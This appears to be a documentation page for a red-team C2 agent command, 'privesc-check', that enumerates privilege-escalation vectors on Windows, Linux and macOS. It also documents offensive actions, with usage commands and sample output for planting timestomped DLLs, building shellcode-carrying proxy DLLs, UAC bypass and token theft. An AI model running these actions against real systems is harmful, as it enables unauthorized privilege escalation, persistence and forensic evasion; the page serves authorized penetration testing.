+++
title = "privesc-check"
chapter = false
weight = 100
hidden = false
+++

## Summary

Cross-platform privilege escalation enumeration. Scans for common privilege escalation vectors with platform-specific checks for Windows, Linux, and macOS.

- **Windows:** Token privileges (potato attacks, SeDebug, SeBackup), unquoted service paths, modifiable service binaries, AlwaysInstallElevated, auto-logon credentials, UAC configuration, LSA protection, writable PATH directories, unattended install files, DLL search order hijacking (phantom DLL scan + DLL planting with timestomping), DLL sideloading opportunities, service registry permission abuse
- **Linux:** SUID/SGID binaries, file capabilities, sudo rules, writable paths, containers, cron script hijacking, NFS no_root_squash, systemd unit hijacking, sudo token reuse, PATH hijacking, docker/lxd/podman group, dangerous group memberships, Polkit rules, modprobe hooks, ld.so.preload injection, security module status
- **macOS:** LaunchDaemons/Agents, TCC database, dylib hijacking, SIP status

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | No | all | Check to perform (see platform-specific actions below) |
| source | No | — | Path to PE file on target. dll-plant/dll-exports/hijack-execute: DLL to inspect. hijack-deploy: compiled proxy DLL path. |
| target_dir | No | — | Writable directory to plant DLL in (for dll-plant, hijack-deploy, hijack-cleanup) |
| dll_name | No | — | Name for planted DLL, e.g. 'fveapi.dll' (for dll-plant, hijack-deploy, hijack-cleanup) |
| timestomp | No | true | Match planted DLL timestamps to kernel32.dll (for dll-plant action only) |
| shellcode | No | — | Shellcode file to embed in proxy DLL (for hijack-execute). Select from Mythic file store. |

### Shared Actions (All Platforms)

- **all** — Run all platform-appropriate checks
- **auto-escalate** — Automated chain: enumerate all vectors, then attempt the best available privilege escalation. Windows: UAC bypass (medium→high) or token steal (high→SYSTEM). Linux/macOS: sudo NOPASSWD escalation. Results visible as a subtask cascade in the Mythic UI.
- **writable** — Find writable PATH directories and sensitive files/paths

### Windows-Only Actions

- **privileges** — Enumerate token privileges, flag exploitable ones (SeImpersonate, SeDebug, SeBackup, etc.) with exploitation guidance
- **services** — Check for unquoted service paths, modifiable service binaries, and writable binary directories
- **registry** — Check AlwaysInstallElevated, auto-logon credentials, LSA protection (RunAsPPL), Credential Guard, WSUS configuration
- **uac** — Report UAC configuration (EnableLUA, ConsentPromptBehavior, Secure Desktop, FilterAdminToken)
- **unattend** — Search for unattended install files (sysprep/Unattend.xml) and other credential-containing files
- **dll-hijack** — Scan for DLL search order hijacking opportunities: SafeDllSearchMode, 15 phantom DLLs, writable PATH directories, KnownDLLs protection
- **dll-plant** — Plant a DLL in a target directory for DLL search order hijacking (T1574.001). Requires source, target_dir, and dll_name parameters. Auto-timestomps to kernel32.dll
- **dll-sideload** — Scan for DLL sideloading opportunities: finds executables that load DLLs from their own directory where the directory is writable (T1574.002)
- **dll-exports** — Enumerate the export table of any PE file (DLL or EXE) on disk. Lists all exported functions with ordinals, names, and forwarders. Generates a DEF file for proxy DLL creation. Use with `source` parameter.
- **hijack-execute** — Automated proxy DLL factory. Reads target DLL exports on the remote host, then the server compiles a proxy DLL that forwards all exports to a renamed copy of the original while executing embedded shellcode via DllMain. Requires `source` (target DLL path) and `shellcode` (Mythic file) parameters. (T1574.001)
- **hijack-deploy** — Deploy a compiled proxy DLL: renames the original DLL to `*_orig.dll` and places the proxy in its place. Requires `source` (proxy DLL path on target), `target_dir`, and `dll_name` parameters. Rolls back rename on failure.
- **hijack-cleanup** — Reverse a deployed DLL hijack: deletes the proxy DLL and restores the original from `*_orig.dll`. Requires `target_dir` and `dll_name` parameters. Use after engagement to clean up artifacts.
- **service-registry** — Check for services with weak registry key permissions (WriteDACL, WriteOwner, ChangeConfig) that allow modifying the service binary path or configuration for privilege escalation (T1574.011)

### Linux-Only Actions

- **suid** — Find SUID/SGID binaries, flag exploitable ones (find, python, docker, etc.)
- **sudo** — Check `sudo -l` (non-interactive), read `/etc/sudoers` if accessible
- **capabilities** — Enumerate file capabilities via `getcap` and current process capabilities
- **container** — Detect Docker, Kubernetes, LXC, overlay FS, container cgroups
- **cron** — Find writable cron scripts that run as root (hijackable for command injection)
- **nfs** — Check /etc/exports for NFS shares with no_root_squash (SUID binary deployment)
- **systemd** — Find writable systemd service/timer files (ExecStart hijacking)
- **sudo-token** — Check for sudo timestamp files and ptrace_scope (token reuse via ptrace)
- **path-hijack** — Check for writable directories in PATH before system directories (command hijacking)
- **docker-group** — Check docker/lxd/podman group membership and Docker socket access (trivial root escalation)
- **group** — Check membership in 18 dangerous groups (disk, shadow, adm, sudo, kvm, etc.) with risk levels and exploitation guidance
- **polkit** — Enumerate Polkit JS rules, legacy .pkla files, and action policies. Detects writable rules directories, SUID pkexec (CVE-2021-4034), and unauthenticated access rules
- **modprobe** — Scan modprobe.d for writable configs and install/remove hooks that execute commands on module load. Check module auto-load lists and modprobe SUID
- **ld-preload** — Check /etc/ld.so.preload writability (global library injection), LD_PRELOAD env var, LD_LIBRARY_PATH writable directories, writable /etc/ld.so.conf.d configs
- **security** — Check AppArmor status (enabled/disabled, enforce/complain profile counts) and SELinux status (enforcing/permissive/disabled, config file, policy type)

### macOS-Only Actions

- **launchdaemons** — Check for writable LaunchDaemons/LaunchAgents plists (persistence + privesc)
- **tcc** — Inspect TCC database for granted permissions (Full Disk Access, Accessibility, etc.)
- **dylib** — Check DYLD_* environment variables, Hardened Runtime status, writable library paths
- **sip** — Check System Integrity Protection and Authenticated Root status

## Usage

```
privesc-check -action all
privesc-check -action privileges
privesc-check -action services
privesc-check -action registry
privesc-check -action uac
privesc-check -action suid
privesc-check -action cron
privesc-check -action nfs
privesc-check -action systemd
privesc-check -action sudo-token
privesc-check -action path-hijack
privesc-check -action docker-group
privesc-check -action group
privesc-check -action polkit
privesc-check -action modprobe
privesc-check -action ld-preload
privesc-check -action security
privesc-check -action launchdaemons
privesc-check -action dll-hijack
privesc-check -action dll-plant -source C:\Users\target\payload.dll -target_dir C:\Python39\ -dll_name fveapi.dll
privesc-check -action dll-sideload
privesc-check -action service-registry

# DLL Hijack Factory: generate proxy DLL with embedded shellcode
# Step 1: Build a Fawkes shellcode payload (output format = shellcode)
# Step 2: Generate proxy DLL (server compiles with mingw)
privesc-check -action hijack-execute -source C:\Windows\System32\version.dll -shellcode fawkes.bin

# Step 3: Upload the compiled proxy DLL to the target
upload -file_id proxy_version.dll -remote_path C:\Users\target\proxy_version.dll

# Step 4: Deploy (rename original, place proxy)
privesc-check -action hijack-deploy -source C:\Users\target\proxy_version.dll -target_dir C:\VulnerableApp\ -dll_name version.dll

# Step 5: After engagement — clean up (delete proxy, restore original)
privesc-check -action hijack-cleanup -target_dir C:\VulnerableApp\ -dll_name version.dll

# Auto-escalate chain (enumerate → attempt escalation automatically)
privesc-check -action auto-escalate
```

### Example Output (Windows, all)

```
=== WINDOWS PRIVILEGE ESCALATION CHECK ===

--- Token Privileges ---
Token privileges (23 total):
  SeIncreaseQuotaPrivilege               [Disabled]
  SeSecurityPrivilege                    [Disabled]
  SeBackupPrivilege                      [Disabled]
  SeImpersonatePrivilege                 [Enabled]
  ...

[!] EXPLOITABLE privileges (3):
  [!] SeImpersonatePrivilege              [Enabled]  → Potato attacks (JuicyPotato, PrintSpoofer, GodPotato) → SYSTEM
  [*] SeBackupPrivilege                   [Disabled] → Read any file (SAM, SYSTEM hives, NTDS.dit)
  [!] SeDebugPrivilege                    [Enabled]  → Inject into/dump any process including LSASS

Note: Disabled privileges can be enabled with 'getprivs -action enable -privilege <name>'

Integrity Level: High (S-1-16-12288) (elevated admin)

--- UAC Configuration ---
UAC is enabled (EnableLUA = 1)
Admin consent prompt behavior: Prompt for consent for non-Windows binaries (5) — DEFAULT
[*] Standard config — UAC bypass via auto-elevating binaries possible (fodhelper, computerdefaults, sdclt)

--- Service Misconfigurations ---
Checked 247 services:

Unquoted service paths (2):
  VulnerableService
    Path: C:\Program Files\Vulnerable App\service.exe -start
    Start: Auto
[!] Unquoted paths with spaces allow binary planting in intermediate directories

--- Registry Checks ---
AlwaysInstallElevated:
  Not enabled (safe)

Auto-Logon Credentials:
  Not configured

LSA Protection:
  [!] LSA Protection (RunAsPPL) is NOT enabled — LSASS can be dumped
```

## MITRE ATT&CK Mapping

| Technique ID | Name |
|--------------|------|
| T1548 | Abuse Elevation Control Mechanism |
| T1548.001 | Setuid and Setgid |
| T1548.002 | Bypass User Account Control |
| T1574.001 | Hijack Execution Flow: DLL Search Order Hijacking |
| T1574.002 | Hijack Execution Flow: DLL Side-Loading |
| T1574.009 | Path Interception by Unquoted Path |
| T1574.011 | Hijack Execution Flow: Services Registry Permissions Weakness |
| T1552.001 | Unsecured Credentials: Credentials In Files |
| T1613 | Container and Resource Discovery |
| T1082 | System Information Discovery |
